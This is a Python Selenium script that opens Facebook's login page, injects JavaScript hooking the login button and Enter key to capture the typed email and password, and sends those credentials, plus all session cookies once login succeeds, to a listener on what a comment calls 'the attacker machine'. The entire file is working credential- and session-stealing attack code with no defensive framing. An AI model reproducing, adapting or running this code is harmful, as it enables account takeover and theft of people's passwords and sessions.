import os
import time
import shutil
import requests

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# Change it to the attacker machine where listener.py is running
LISTENER_URL = "http://localhost:5000"

# browser = webdriver.Firefox()
firefox_paths = [
    os.path.join("C:", "Program Files", "Mozilla Firefox", "firefox.exe"),
    os.path.join("C:", "Program Files (x86)", "Mozilla Firefox", "firefox.exe")
]

chrome_paths = [
    os.path.join("C:", "Program Files", "Google", "Chrome", "Application", "chrome.exe"),
    os.path.join("C:", "Program Files (x86)", "Google", "Chrome", "Application", "chrome.exe")
]

# browser = webdriver.Firefox()

# Check which browser is installed on Windows
browser = None
if any(os.path.exists(path) for path in firefox_paths) or shutil.which("firefox"):
    # print("Firefox")
    browser = webdriver.Firefox()

elif any(os.path.exists(path) for path in chrome_paths) or shutil.which("chrome") or shutil.which("chromium"):
    # print("Chrome")
    browser = webdriver.Chrome()

else:
    # print("Edge")
    browser = webdriver.Edge()

browser.fullscreen_window()
browser.get("https://www.facebook.com/")

logIn_btn = WebDriverWait(browser, 100).until(EC.presence_of_element_located((
    By.XPATH,
    '//input[@name="email"]'
)))

browser.execute_script("""
(function() {

function getter() {
    const emailInput = document.querySelector('input[name="email"]');
    const passInput = document.querySelector('input[name="pass"]');

    if (!emailInput || !passInput) {
        console.log("Inputs not found");
        return;
    }

    let username = emailInput.value;
    let password = passInput.value;

    window.capturedForm = {
        username: username,
        password: password
    };

    console.log(username, password);
}

let login_btn = document.querySelector('div[aria-label="Se connecter"]');

if (!login_btn) {
    console.log("ENG");
    login_btn = document.querySelector('div[aria-label="Log In"]');
} else {
    console.log("FR");
}


if (login_btn) {
    login_btn.addEventListener("click", function(event) {
        getter();
    });
} else {
    console.log("Login button not found");
}

document.addEventListener("keydown", function(event) {
    if (event.key === "Enter") {
        getter();
    }
});

})();
""")

while not browser.get_cookie("c_user"):
    # print("Miandry...")
    data = browser.execute_script("return window.capturedForm")
    if data:
        requests.post(f"{LISTENER_URL}/catch", json=data)
        browser.execute_script("window.capturedForm = null;")
    time.sleep(1)

# print("Azoooo")
cookies = ""
for cookie in browser.get_cookies():
    cookies += f"{cookie['name']}={cookie['value']};"
requests.post(f"{LISTENER_URL}/catch", json={
    "cookies": cookies
})

time.sleep(3)
# browser.close()